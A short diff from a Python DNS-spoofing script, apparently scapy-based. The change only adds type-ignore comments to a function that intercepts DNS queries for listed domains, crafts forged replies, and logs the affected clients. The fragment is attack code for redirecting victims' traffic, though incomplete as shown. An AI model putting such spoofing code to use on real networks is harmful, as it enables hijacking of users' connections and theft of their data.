@@ -28,7 +28,7 @@ def dns_spoof(pkt):
         qname = pkt[DNSQR].qname.decode().rstrip(".")#type:ignore
         if qname in URLS.keys():
             #print(f"Intercepted DNS query for {qname}")
-            srcip = pkt[IP].src
+            srcip = pkt[IP].src #type:ignore
             # Craft spoofed DNS response
             spoofed_pkt = (
                 IP(dst=pkt[IP].src, src=pkt[IP].dst) /#type:ignore
@@ -51,7 +51,7 @@ def dns_spoof(pkt):
             MAPPER.add_client(srcip,URLS[qname]) #type:ignore
             
 def build_dict_from_packet(pkt):
-    return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
+    return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())} #type:ignore
 
 
 
